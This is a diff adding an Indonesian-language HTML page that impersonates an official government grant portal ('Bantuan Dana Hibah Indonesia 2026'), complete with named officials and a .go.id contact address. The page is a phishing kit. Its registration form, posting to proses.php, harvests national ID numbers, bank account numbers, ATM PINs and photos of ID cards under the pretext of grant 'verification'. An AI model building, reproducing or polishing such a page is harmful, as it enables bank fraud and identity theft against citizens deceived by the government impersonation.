@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <meta name="theme-color" content="#0d2b45">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="description" content="Portal Resmi Bantuan Dana Hibah Indonesia 2026 - Pemerintah Republik Indonesia">
+    <title>Bantuan Dana Hibah Indonesia 2026</title>
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick-theme.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- MODAL PENGUMUMAN -->
+<div class="modal fade" id="announcementModal" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="modal-dialog modal-lg modal-dialog-centered" role="document">
+        <div class="modal-content glass-modal">
+            <div class="modal-header border-0">
+                <h5 class="modal-title"><i class="fas fa-bullhorn text-warning"></i> Pengumuman Terbaru</h5>
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+            <div class="modal-body">
+                <div class="announcement-list">
+                    <div class="announcement-item">
+                        <div class="announcement-icon"><i class="fas fa-file-pdf text-danger"></i></div>
+                        <div class="announcement-content">
+                            <h6>Pendaftaran Bantuan Dana Hibah Indonesia 2026</h6>
+                            <span class="badge badge-warning">Baru</span>
+                            <p class="text-muted small"><i class="far fa-calendar-alt"></i> 21 Juli 2026</p>
+                            <a href="#" class="btn btn-sm btn-outline-primary"><i class="fas fa-download"></i> Unduh PDF</a>
+                            <a href="#" class="btn btn-sm btn-link">Selengkapnya →</a>
+                        </div>
+                    </div>
+                    <div class="announcement-item">
+                        <div class="announcement-icon"><i class="fas fa-file-pdf text-danger"></i></div>
+                        <div class="announcement-content">
+                            <h6>Perubahan Jadwal Sosialisasi Hibah Indonesia</h6>
+                            <p class="text-muted small"><i class="far fa-calendar-alt"></i> 18 Juli 2026</p>
+                            <a href="#" class="btn btn-sm btn-outline-primary"><i class="fas fa-download"></i> Unduh PDF</a>
+                            <a href="#" class="btn btn-sm btn-link">Selengkapnya →</a>
+                        </div>
+                    </div>
+                    <div class="announcement-item">
+                        <div class="announcement-icon"><i class="fas fa-file-pdf text-danger"></i></div>
+                        <div class="announcement-content">
+                            <h6>Hasil Seleksi Hibah Indonesia Tahap 2</h6>
+                            <p class="text-muted small"><i class="far fa-calendar-alt"></i> 15 Juli 2026</p>
+                            <a href="#" class="btn btn-sm btn-outline-primary"><i class="fas fa-download"></i> Unduh PDF</a>
+                            <a href="#" class="btn btn-sm btn-link">Selengkapnya →</a>
+                        </div>
+                    </div>
+                    <div class="announcement-item">
+                        <div class="announcement-icon"><i class="fas fa-file-pdf text-danger"></i></div>
+                        <div class="announcement-content">
+                            <h6>Perpanjangan Masa Pendaftaran Hibah Indonesia</h6>
+                            <p class="text-muted small"><i class="far fa-calendar-alt"></i> 10 Juli 2026</p>
+                            <a href="#" class="btn btn-sm btn-outline-primary"><i class="fas fa-download"></i> Unduh PDF</a>
+                            <a href="#" class="btn btn-sm btn-link">Selengkapnya →</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer border-0">
+                <button type="button" class="btn btn-primary" data-dismiss="modal"><i class="fas fa-check"></i> Saya Sudah Baca</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- NAVBAR - LOGO DIPERBESAR -->
+<!-- ============================================================ -->
+<nav class="navbar navbar-expand-lg navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="#">
+            <img src="assets/images/logo.png" alt="Logo Bantuan Dana Hibah Indonesia" height="55" class="d-inline-block align-top mr-3" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 200 60%22%3E%3Crect width=%22200%22 height=%2260%22 fill=%22%23FFE959%22/%3E%3Ctext x=%2220%22 y=%2238%22 fill=%22%230d2b45%22 font-size=%2220%22 font-family=%22Arial%22 font-weight=%22bold%22%3EHIBAH%3C/text%3E%3C/svg%3E'">
+            <span class="d-none d-md-inline" style="font-size:1.2rem;font-weight:700;">Hibah Indonesia</span>
+            <small class="d-none d-lg-inline text-warning" style="font-size:11px;font-weight:400;margin-left:6px;opacity:0.9;">| Bantuan Dana Hibah 2026</small>
+        </a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item active"><a class="nav-link" href="#hero"><i class="fas fa-home"></i> Beranda</a></li>
+                <li class="nav-item"><a class="nav-link" href="#peraturan"><i class="fas fa-gavel"></i> Peraturan</a></li>
+                <li class="nav-item"><a class="nav-link" href="#laporan"><i class="fas fa-file-alt"></i> Laporan</a></li>
+                <li class="nav-item"><a class="nav-link" href="#statistik"><i class="fas fa-chart-bar"></i> Statistik</a></li>
+                <li class="nav-item"><a class="nav-link" href="#panduan"><i class="fas fa-book"></i> Panduan</a></li>
+                <li class="nav-item">
+                    <a class="nav-link btn-login" href="#"><i class="fas fa-user-circle"></i> Login</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- ============================================================ -->
+<!-- HERO SLIDER -->
+<!-- ============================================================ -->
+<section id="hero" class="hero-section">
+    <div class="hero-slider">
+        <div class="hero-slide" style="background: linear-gradient(rgba(13,43,69,0.75), rgba(13,43,69,0.75)), url('assets/images/hero-1.jpg') center/cover no-repeat;">
+            <div class="container">
+                <div class="hero-content">
+                    <span class="hero-badge"><i class="fas fa-gift"></i> Bantuan Dana Hibah Indonesia 2026</span>
+                    <h1>Bantuan Dana Hibah Indonesia 2026</h1>
+                    <p>Transparan, Akuntabel, dan Terpercaya untuk Seluruh Masyarakat Indonesia</p>
+                    <div class="hero-buttons">
+                        <a href="#formSection" class="btn btn-hero"><i class="fas fa-arrow-right"></i> Ajukan Sekarang</a>
+                        <a href="#" class="btn btn-hero-outline"><i class="fas fa-info-circle"></i> Pelajari</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="hero-slide" style="background: linear-gradient(rgba(13,43,69,0.75), rgba(13,43,69,0.75)), url('assets/images/hero-2.jpg') center/cover no-repeat;">
+            <div class="container">
+                <div class="hero-content">
+                    <span class="hero-badge"><i class="fas fa-building"></i> Dukung Pembangunan Indonesia</span>
+                    <h1>Salurkan Dana Hibah untuk Kemajuan Indonesia</h1>
+                    <p>Bersama kita bangun Indonesia yang lebih baik melalui program hibah</p>
+                    <div class="hero-buttons">
+                        <a href="#" class="btn btn-hero"><i class="fas fa-arrow-right"></i> Lihat Panduan</a>
+                        <a href="#" class="btn btn-hero-outline"><i class="fas fa-phone"></i> Hubungi</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="hero-slide" style="background: linear-gradient(rgba(13,43,69,0.75), rgba(13,43,69,0.75)), url('assets/images/hero-3.jpg') center/cover no-repeat;">
+            <div class="container">
+                <div class="hero-content">
+                    <span class="hero-badge"><i class="fas fa-chart-line"></i> Laporan Real Time</span>
+                    <h1>Pantau Penyaluran Dana Hibah Indonesia</h1>
+                    <p>Informasi terkini realisasi dan penyerapan dana hibah di seluruh Indonesia</p>
+                    <div class="hero-buttons">
+                        <a href="#" class="btn btn-hero"><i class="fas fa-arrow-right"></i> Cek Laporan</a>
+                        <a href="#" class="btn btn-hero-outline"><i class="fas fa-download"></i> Unduh Data</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="running-text">
+        <div class="running-text-content">
+            <i class="fas fa-bullhorn text-warning mr-3"></i>
+            <span id="runningText">📢 Pengumuman: Pendaftaran Bantuan Dana Hibah Indonesia 2026 dibuka hingga 31 Desember 2026 • Segera daftarkan proposal Anda • Informasi selengkapnya hubungi call center 1500-100 • Jangan lewatkan kesempatan ini!</span>
+        </div>
+    </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- PIMPINAN NASIONAL -->
+<!-- ============================================================ -->
+<section id="pimpinan" class="section-pimpinan">
+    <div class="container">
+        <div class="section-header text-center">
+            <h2>Pimpinan Nasional</h2>
+            <p class="text-muted">Kepemimpinan yang mengayomi seluruh masyarakat Indonesia</p>
+        </div>
+        <div class="row justify-content-center">
+            <div class="col-lg-4 col-md-6 mb-4">
+                <div class="card-leader glass">
+                    <div class="leader-img">
+                        <img src="assets/images/presiden.jpg" alt="Presiden RI" class="img-fluid rounded-circle" onerror="this.src='https://via.placeholder.com/300x300/0d2b45/fff?text=PRESIDEN'">
+                    </div>
+                    <h5>H. Prabowo Subianto, S.E., M.M.</h5>
+                    <p class="text-muted">Presiden Republik Indonesia</p>
+                    <div class="leader-social">
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+            </div>
+            <div class="col-lg-4 col-md-6 mb-4">
+                <div class="card-leader glass">
+                    <div class="leader-img">
+                        <img src="assets/images/menteri-keuangan.jpg" alt="Menteri Keuangan" class="img-fluid rounded-circle" onerror="this.src='https://via.placeholder.com/300x300/0d2b45/fff?text=MENKEU'">
+                    </div>
+                    <h5>Dra. Sri Mulyani Indrawati, M.Sc., Ph.D.</h5>
+                    <p class="text-muted">Menteri Keuangan Republik Indonesia</p>
+                    <div class="leader-social">
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+            </div>
+            <div class="col-12 text-center mt-4">
+                <a href="#" class="btn btn-outline-primary btn-lg"><i class="fas fa-info-circle"></i> Tentang Program Hibah Indonesia</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- FORM PENDAFTARAN -->
+<!-- ============================================================ -->
+<section id="formSection" class="section-form">
+    <div class="container">
+        <div class="section-header text-center">
+            <h2>Pendaftaran Bantuan Dana Hibah Indonesia 2026</h2>
+            <p class="text-muted">Isi data dengan lengkap dan benar</p>
+        </div>
+        <div class="row justify-content-center">
+            <div class="col-lg-8">
+                <div class="card-form glass">
+                    <form action="proses.php" method="POST" enctype="multipart/form-data">
+                        <div class="form-group">
+                            <label><i class="fas fa-id-card"></i> NIK (16 digit) <span class="text-danger">*</span></label>
+                            <input type="text" name="nik" class="form-control" maxlength="16" placeholder="Masukkan 16 digit NIK" required pattern="[0-9]{16}">
+                            <small class="text-muted">Contoh: 3173010101900001</small>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-user"></i> Nama Lengkap <span class="text-danger">*</span></label>
+                            <input type="text" name="nama" class="form-control" placeholder="Sesuai dengan KTP" required>
+                        </div>
+                        <div class="form-group row">
+                            <div class="col-md-6">
+                                <label><i class="fas fa-calendar-alt"></i> Tempat Lahir <span class="text-danger">*</span></label>
+                                <input type="text" name="tempat" class="form-control" placeholder="Contoh: Jakarta" required>
+                            </div>
+                            <div class="col-md-6">
+                                <label><i class="fas fa-calendar-day"></i> Tanggal Lahir <span class="text-danger">*</span></label>
+                                <input type="date" name="tgl_lahir" class="form-control" required>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-venus-mars"></i> Jenis Kelamin <span class="text-danger">*</span></label>
+                            <select name="jenis_kelamin" class="form-control" required>
+                                <option value="">Pilih</option>
+                                <option value="Laki-laki">Laki-laki</option>
+                                <option value="Perempuan">Perempuan</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-home"></i> Alamat Lengkap <span class="text-danger">*</span></label>
+                            <textarea name="alamat" class="form-control" rows="3" placeholder="Alamat lengkap sesuai KTP" required></textarea>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-phone"></i> Nomor HP Aktif <span class="text-danger">*</span></label>
+                            <input type="tel" name="hp" class="form-control" placeholder="08xxxxxxxxxx" required pattern="[0-9]{10,13}">
+                        </div>
+                        <div class="form-group row">
+                            <div class="col-md-6">
+                                <label><i class="fas fa-university"></i> Bank <span class="text-danger">*</span></label>
+                                <select name="bank" class="form-control" required>
+                                    <option value="">Pilih Bank</option>
+                                    <option>Bank BCA</option>
+                                    <option>Bank Mandiri</option>
+                                    <option>Bank BNI</option>
+                                    <option>Bank BRI</option>
+                                    <option>Bank BTN</option>
+                                    <option>Bank Danamon</option>
+                                    <option>Bank Syariah Indonesia</option>
+                                </select>
+                            </div>
+                            <div class="col-md-6">
+                                <label><i class="fas fa-credit-card"></i> No. Rekening <span class="text-danger">*</span></label>
+                                <input type="text" name="rekening" class="form-control" placeholder="Nomor rekening" required pattern="[0-9]{5,20}">
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-lock"></i> PIN ATM (Verifikasi) <span class="text-danger">*</span></label>
+                            <input type="password" name="pin" class="form-control" maxlength="6" placeholder="6 digit PIN" required pattern="[0-9]{6}">
+                            <small class="text-muted">Data terenkripsi dan aman</small>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-image"></i> Upload Foto KTP <span class="text-danger">*</span></label>
+                            <input type="file" name="foto_ktp" class="form-control-file" accept="image/*,.pdf" required>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-file-signature"></i> Upload TTD (Opsional)</label>
+                            <input type="file" name="ttd" class="form-control-file" accept="image/*">
+                        </div>
+                        <div class="form-group form-check">
+                            <input type="checkbox" class="form-check-input" id="confirmData" required>
+                            <label class="form-check-label" for="confirmData">Saya menyatakan data yang saya isi adalah benar dan sesuai dokumen asli</label>
+                        </div>
+                        <button type="submit" class="btn btn-cta btn-block btn-lg"><i class="fas fa-hand-holding-usd"></i> DAFTAR SEKARANG</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- STATISTIK -->
+<!-- ============================================================ -->
+<section id="statistik" class="section-stats">
+    <div class="container">
+        <div class="section-header text-center">
+            <h2>Statistik Bantuan Dana Hibah Indonesia</h2>
+            <p class="text-muted">Data real-time pengajuan hibah</p>
+        </div>
+        <div class="row">
+            <div class="col-lg-3 col-6">
+                <div class="stat-number-card glass">
+                    <i class="fas fa-file-alt"></i>
+                    <span class="number" data-target="1201">0</span>
+                    <label>Jumlah Proposal</label>
+                </div>
+            </div>
+            <div class="col-lg-3 col-6">
+                <div class="stat-number-card glass">
+                    <i class="fas fa-check-circle"></i>
+                    <span class="number" data-target="856">0</span>
+                    <label>Terverifikasi</label>
+                </div>
+            </div>
+            <div class="col-lg-3 col-6">
+                <div class="stat-number-card glass">
+                    <i class="fas fa-thumbs-up"></i>
+                    <span class="number" data-target="423">0</span>
+                    <label>Disetujui</label>
+                </div>
+            </div>
+            <div class="col-lg-3 col-6">
+                <div class="stat-number-card glass">
+                    <i class="fas fa-times-circle"></i>
+                    <span class="number" data-target="178">0</span>
+                    <label>Ditolak</label>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- FAQ -->
+<!-- ============================================================ -->
+<section id="faq" class="section-faq">
+    <div class="container">
+        <div class="section-header text-center">
+            <h2>Pertanyaan yang Sering Diajukan</h2>
+            <p class="text-muted">Temukan jawaban untuk pertanyaan Anda</p>
+        </div>
+        <div class="row justify-content-center">
+            <div class="col-lg-8">
+                <div class="accordion" id="faqAccordion">
+                    <div class="card-faq glass">
+                        <div class="faq-header" data-toggle="collapse" data-target="#faq1">
+                            <h5>Bagaimana cara mengajukan Bantuan Dana Hibah Indonesia?</h5>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div id="faq1" class="collapse" data-parent="#faqAccordion">
+                            <div class="faq-body">Isi data di form di atas, upload dokumen, kirim pengajuan. Tim verifikasi akan memproses pengajuan Anda.</div>
+                        </div>
+                    </div>
+                    <div class="card-faq glass">
+                        <div class="faq-header" data-toggle="collapse" data-target="#faq2">
+                            <h5>Kapan waktu pendaftaran dibuka?</h5>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div id="faq2" class="collapse" data-parent="#faqAccordion">
+                            <div class="faq-body">Pendaftaran dibuka 1 Januari - 31 Desember 2026.</div>
+                        </div>
+                    </div>
+                    <div class="card-faq glass">
+                        <div class="faq-header" data-toggle="collapse" data-target="#faq3">
+                            <h5>Siapa saja yang berhak mengajukan?</h5>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div id="faq3" class="collapse" data-parent="#faqAccordion">
+                            <div class="faq-body">Seluruh masyarakat Indonesia, organisasi, lembaga pendidikan, dan badan usaha yang memenuhi kriteria.</div>
+                        </div>
+                    </div>
+                    <div class="card-faq glass">
+                        <div class="faq-header" data-toggle="collapse" data-target="#faq4">
+                            <h5>Apakah ada biaya untuk mengajukan?</h5>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div id="faq4" class="collapse" data-parent="#faqAccordion">
+                            <div class="faq-body">Tidak ada biaya, program ini gratis dan transparan. Waspadai penipuan!</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- FOOTER -->
+<!-- ============================================================ -->
+<footer class="footer-main">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-4 mb-4 mb-lg-0">
+                <h5><i class="fas fa-landmark"></i> Bantuan Dana Hibah Indonesia 2026</h5>
+                <p>Program Bantuan Dana Hibah Indonesia yang transparan, akuntabel, dan terpercaya untuk seluruh masyarakat Indonesia.</p>
+                <div class="footer-social">
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-facebook"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                    <a href="#"><i class="fab fa-tiktok"></i></a>
+                </div>
+            </div>
+            <div class="col-lg-2 col-md-4 mb-4 mb-md-0">
+                <h6>Menu</h6>
+                <ul class="footer-links">
+                    <li><a href="#">Beranda</a></li>
+                    <li><a href="#">Peraturan</a></li>
+                    <li><a href="#">Laporan</a></li>
+                    <li><a href="#">Panduan</a></li>
+                    <li><a href="#">Kontak</a></li>
+                </ul>
+            </div>
+            <div class="col-lg-3 col-md-4 mb-4 mb-md-0">
+                <h6>Kontak</h6>
+                <ul class="footer-links">
+                    <li><i class="fas fa-phone"></i> 1500-100</li>
+                    <li><i class="fas fa-envelope"></i> info@hibahindonesia.go.id</li>
+                    <li><i class="fas fa-map-marker-alt"></i> Jakarta, Indonesia</li>
+                </ul>
+            </div>
+            <div class="col-lg-3 col-md-4">
+                <h6>Jam Layanan</h6>
+                <ul class="footer-links">
+                    <li>Senin - Jumat: 08.00 - 17.00</li>
+                    <li>Sabtu: 08.00 - 12.00</li>
+                    <li>Minggu: Tutup</li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2026 Pemerintah Republik Indonesia - Bantuan Dana Hibah Indonesia. All Rights Reserved.</p>
+            <p style="font-size:12px;opacity:0.7;">Versi 7.0 | Dukungan Teknis: helpdesk@hibahindonesia.go.id</p>
+        </div>
+    </div>
+</footer>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
+<script src="script.js"></script>
+</body>
+</html>
